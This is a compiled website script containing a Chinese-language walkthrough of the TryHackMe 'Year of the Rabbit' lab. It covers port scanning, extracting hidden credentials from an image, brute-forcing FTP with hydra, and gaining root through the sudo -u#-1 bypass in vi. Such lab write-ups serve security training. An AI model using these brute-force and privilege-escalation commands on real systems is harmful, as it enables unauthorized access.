"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[4661],{80372:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>o,toc:()=>d});var t=s(74848),r=s(28453);const i={sidebar_position:18,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u6587\u4ef6\u9690\u5199","SUDO"],title:"Year of the Rabbit",sidebar_label:"Year of the Rabbit"},a="Year of the Rabbit",o={id:"box/TryHackMe/18",title:"Year of the Rabbit",description:"\u7aef\u53e3\u626b\u63cf",source:"@site/docs/box/TryHackMe/18.md",sourceDirName:"box/TryHackMe",slug:"/box/TryHackMe/18",permalink:"/docs/box/TryHackMe/18",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"\u6587\u4ef6\u9690\u5199",permalink:"/docs/tags/\u6587\u4ef6\u9690\u5199"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:18,frontMatter:{sidebar_position:18,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","\u6587\u4ef6\u9690\u5199","SUDO"],title:"Year of the Rabbit",sidebar_label:"Year of the Rabbit"},sidebar:"boxSidebar",previous:{title:"Wgel CTF",permalink:"/docs/box/TryHackMe/17"},next:{title:"Brute It",permalink:"/docs/box/TryHackMe/19"}},l={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"eli",id:"eli",level:3},{value:"eli \u2014&gt; Gwendoline",id:"eli--gwendoline",level:3},{value:"Gwendoline \u2014&gt; root",id:"gwendoline--root",level:3}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"year-of-the-rabbit",children:"Year of the Rabbit"}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-119-226:~# rustscan -a  10.10.206.59 -p 21,22,80 -u 5000 -- -sTCV\nPORT   STATE SERVICE REASON  VERSION\n21/tcp open  ftp     syn-ack vsftpd 3.0.2\n22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)\n| ssh-hostkey: \n|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)\n| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==\n|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd\n|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=\n|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh\n80/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.10 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsx)(n.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-119-226:~# gobuster dir -u http://10.10.206.59/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.206.59/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2023/08/07 03:55:57 Starting gobuster\n===============================================================\n/assets (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/08/07 03:56:13 Finished\n===============================================================\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u8bbf\u95ee assets \u76ee\u5f55\u6211\u4eec\u53d1\u73b0\u4e24\u4e2a\u6587\u4ef6\uff0c \u5728\u5176\u4e2d\u4e00\u4e2a css \u6587\u4ef6\u4e2d\u63d0\u5230\u4e86\u4e00\u4e2a\u6587\u4ef6"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240530110513.png",alt:"20240530110513"})}),"\n",(0,t.jsx)(n.p,{children:"\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c \u53d1\u73b0\u5176\u662f\u4f1a\u8df3\u8f6c\u5230 \u6cb9\u7ba1\uff0c \u6211\u4eec\u4f7f\u7528 Burp \u8fdb\u884c\u67e5\u770b"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240530110527.png",alt:"20240530110527"})}),"\n",(0,t.jsx)(n.p,{children:"\u53d1\u73b0\u7b2c\u4e8c\u4e2a\u5f53\u4e2d\u63d0\u5230\u4e86\u4e00\u4e2a\u9690\u85cf\u76ee\u5f55\u6211\u4eec\u67e5\u770b\u53d1\u73b0\u4e00\u4e2a\u56fe\u7247\uff0c \u90a3\u4e48\u5bf9\u5e94\u7684\u5b58\u5728\u6587\u4ef6\u9690\u5199\uff0c \u6211\u4eec\u7ee7\u7eed\u67e5\u770b"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-119-226:~# binwalk  -e Hot_Babe.png \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced\n54            0x36            Zlib compressed data, best compression\nroot@ip-10-10-119-226:~/_Hot_Babe.png.extracted# strings 36.zlib\nEh, you've earned this. Username for FTP is ftpuser\nOne of these is the password:\nMou+56n%QK8sr\n1618B0AUshw1M\nA56IpIl%1s02u\nvTFbDzX9&Nmu?\nFfF~sfu^UQZmT\n8FF?iKO27b~V0\nua4W~2-@y7dE$\n3j39aMQQ7xFXT\n\u3002\u3002\u3002\u3002\n"})}),"\n",(0,t.jsx)(n.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,t.jsx)(n.p,{children:"\u8fd9\u8fb9\u63d0\u793a\u544a\u8bc9\u6211\u4eec\u4e00\u4e2a FTP \u7528\u6237\u4ee5\u53ca\u5bc6\u7801\u8868\u6211\u4eec\u8fdb\u884c\u66b4\u529b\u7834\u89e3"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-119-226:~# hydra -l ftpuser -P ftp_pass.txt ftp://10.10.206.59\nHydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (http://www.thc.org/thc-hydra) starting at 2023-08-07 03:59:44\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task\n[DATA] attacking ftp://10.10.206.59:21/\n[21][ftp] host: 10.10.206.59   login: ftpuser   password: 5iez1wGXKfPKQ\n1 of 1 target successfully completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra) finished at 2023-08-07 03:59:58\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u5e10\u53f7\u8fdb\u884c\u767b\u5f55"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-119-226:~# ftp 10.10.206.59\nConnected to 10.10.206.59.\n220 (vsFTPd 3.0.2)\nName (10.10.206.59:root): ftpuser\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt\n226 Directory send OK.\nftp> get Eli's_Creds.txt\nlocal: Eli's_Creds.txt remote: Eli's_Creds.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).\n226 Transfer complete.\n758 bytes received in 0.00 secs (1.5613 MB/s)\nftp>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u770b\u5bf9\u5e94\u7684\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-119-226:~# cat Eli\\'s_Creds.txt \n+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-\n--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+\n++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+\n+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<\n]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+\n++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---\n--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++\n+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+\n++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++\n<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++\n<]>+. <+++[ ->--- <]>-- ---.- ----. <\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u8fdb\u884c\u7834\u89e3 ",(0,t.jsx)(n.a,{href:"https://www.dcode.fr/brainfuck-language",children:"dcode"})]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240530110631.png",alt:"20240530110631"})}),"\n",(0,t.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,t.jsx)(n.h3,{id:"eli",children:"eli"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"ssh eli@10.10.206.59                                               \ue0b2 \u2714 \nThe authenticity of host '10.10.206.59 (10.10.206.59)' can't be established.\nED25519 key fingerprint is SHA256:va5tHoOroEmHPZGWQySirwjIb9lGquhnIA1Q0AY/Wrw.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:125: 10.10.62.79\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.206.59' (ED25519) to the list of known hosts.\neli@10.10.206.59's password: \n\n\n1 new message\nMessage from Root to Gwendoline:\n\n\"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there\"\n\nEND MESSAGE\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u767b\u5f55\u4e4b\u540e\u6709\u4e00\u5219\u6d88\u606f\uff0c  \u544a\u8bc9\u6211\u4eec\u5728 s3cr3t \u4e2d\u6709\u4e00\u4e9b\u6d88\u606f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"eli@year-of-the-rabbit:~$ locate s3cr3t\n/usr/games/s3cr3t\n/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!\n/var/www/html/sup3r_s3cr3t_fl4g.php\neli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!\nYour password is awful, Gwendoline. \nIt should be at least 60 characters long! Not just MniVCQVhQHUNI\nHonestly!\n\nYours sincerely\n   -Root\n"})}),"\n",(0,t.jsx)(n.h3,{id:"eli--gwendoline",children:"eli \u2014> Gwendoline"}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c\u767b\u5f55"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"eli@year-of-the-rabbit:/home$ su gwendoline\nPassword: \ngwendoline@year-of-the-rabbit:/home$ id\nuid=1001(gwendoline) gid=1001(gwendoline) groups=1001(gwendoline)\n"})}),"\n",(0,t.jsx)(n.h3,{id:"gwendoline--root",children:"Gwendoline \u2014> root"}),"\n",(0,t.jsx)(n.p,{children:"\u6211\u4eec\u67e5\u770b\u53d1\u73b0\u5bf9\u5e94\u7684\u7528\u6237\u5b58\u5728\u7279\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"gwendoline@year-of-the-rabbit:/home$ sudo -l\nMatching Defaults entries for gwendoline on year-of-the-rabbit:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser gwendoline may run the following commands on year-of-the-rabbit:\n    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5e76\u4e14\u5bf9\u5e94\u7684 sudo \u7248\u672c\u8f83\u4f4e"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"gwendoline@year-of-the-rabbit:~$ sudo -V\nSudo version 1.8.10p3\nSudoers policy plugin version 1.8.10p3\nSudoers file grammar version 43\nSudoers I/O plugin version 1.8.10p3\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u53d1\u73b0\u4e00\u4e2a\u53ef\u4ee5 bypass \u7684 exp ",(0,t.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/47502",children:"sudo 1.8.27 - Security Bypass"})," \u8fdb\u5165 vim \u6267\u884c ",(0,t.jsx)(n.code,{children:":!/bin/sh"})]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"gwendoline@year-of-the-rabbit:/tmp$  sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt\n\n# id\nuid=0(root) gid=0(root) groups=0(root)\n#\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/sudo.gif",alt:"sudo"})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>o});var t=s(96540);const r={},i=t.createContext(r);function a(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);